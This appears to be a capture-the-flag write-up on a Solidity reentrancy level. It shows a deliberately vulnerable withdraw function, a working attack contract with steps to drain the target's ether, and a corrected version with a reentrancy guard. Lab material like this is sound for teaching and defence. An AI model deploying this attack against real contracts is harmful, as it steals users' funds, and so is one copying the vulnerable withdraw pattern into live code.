# Level 10: Re-entrancy

## Goal

Steal all the ether from the contract.

## The contract

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result, ) = msg.sender.call{value: _amount}("");
        if (result) { _amount; }
        balances[msg.sender] -= _amount;   // state updated AFTER the external call
    }
}
```

## Vulnerability

Classic reentrancy. `withdraw` sends ether with `call` **before** decrementing `balances[msg.sender]`. The external call hands control to the caller. If the caller is a contract, its `receive` can call `withdraw` again while its balance still reads the original value, letting it withdraw repeatedly and drain the contract.

## Exploit

```solidity
contract ReentrancyAttack {
    Reentrance public target;
    uint256 public amount;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    function attack() external payable {
        amount = msg.value;
        target.donate{value: amount}(address(this)); // register a balance
        target.withdraw(amount);                     // start the drain
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount); // re-enter before balance is zeroed
        }
    }
}
```

Deploy with an amount equal to the target's balance (e.g. 0.001 ether), call `attack()`, and the recursive `withdraw` calls empty the contract.

## Fix

1. **Checks-Effects-Interactions:** update `balances[msg.sender] -= _amount` **before** the external call.
2. Add a **reentrancy guard** (e.g. OpenZeppelin `nonReentrant`).
3. Prefer `transfer`/limited gas or the withdrawal pattern for payouts.

```solidity
function withdraw(uint256 _amount) public nonReentrant {
    require(balances[msg.sender] >= _amount, "insufficient");
    balances[msg.sender] -= _amount;               // effect first
    (bool ok, ) = msg.sender.call{value: _amount}(""); // interaction last
    require(ok, "transfer failed");
}
```

## Takeaway

Reentrancy is the most infamous smart-contract bug (the DAO hack). Always finish state changes before making external calls, and guard sensitive functions.
